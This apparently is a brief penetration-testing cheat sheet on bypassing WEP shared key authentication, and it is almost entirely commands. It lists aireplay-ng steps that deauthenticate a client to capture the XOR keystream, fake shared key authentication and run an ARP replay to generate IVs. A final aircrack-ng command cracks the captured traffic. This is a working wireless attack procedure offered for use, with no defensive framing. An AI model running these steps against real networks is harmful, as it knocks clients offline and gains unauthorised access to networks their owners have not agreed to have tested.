# bypassing shared key auth

Deauthenticate the connected client to capture the PRGA XOR keystream:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Conduct a fake shared key authentication using the XOR keystream:

{% code overflow="wrap" %}
```

aireplay-ng -1 0 -e <ESSID> -y <keystreamfile> -a <AP MAC> -h <Your MAC> <interface>
```
{% endcode %}

Launch the ARP request replay attack:

```
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
```

Deauthenticate the victim client again to force the generation of an ARP packet:

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```

Once IVs are being generated by the AP, run Aircrack-ng against the capture:

```
aircrack-ng <capture>
```
